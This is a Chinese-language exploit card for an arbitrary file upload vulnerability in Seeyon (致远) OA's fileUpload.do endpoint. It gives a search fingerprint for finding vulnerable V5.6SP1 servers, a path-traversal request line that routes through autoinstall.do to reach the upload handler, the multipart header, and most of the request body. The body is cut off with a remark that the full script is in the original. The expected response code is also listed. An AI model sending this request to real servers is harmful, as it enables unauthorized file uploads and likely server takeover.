# 致远OAfileUpload.do任意文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="协同管理软件 V5.6SP1"`
- **请求**：`POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=786jbhfjhbinbhbhbjh786`

**请求体 / payload**
```
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="type"
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="extensions"
png
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="applicationCategory"
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="destDirectory"
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="destFilename"
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="maxSize"
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name="isEncrypt"
false
--786jbhfjhbinbhbhbjh786
Content-Disposition: form-data; name…（脚本共 809 字，完整版见原文）
```
- **预期**：200　|　application/pdf